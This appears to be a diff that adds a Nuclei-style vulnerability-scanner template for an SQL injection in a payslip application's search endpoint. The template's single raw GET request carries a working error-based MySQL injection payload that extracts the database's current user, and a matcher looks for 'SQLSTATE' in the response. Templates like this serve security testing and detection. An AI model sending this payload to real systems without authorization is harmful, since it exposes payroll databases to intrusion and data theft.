@@ -1,0 +1,26 @@
+id: szt-payslip-sqli
+
+info:
+  name: szt-payslip-sqli
+  author: szt-payslip-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /payslip/search/index/userid/time?PayslipUser%5Buser_id%5D=1%20AND%20(SELECT%201111%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER()%20AS%20NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)&&yt0 HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"SQLSTATE")
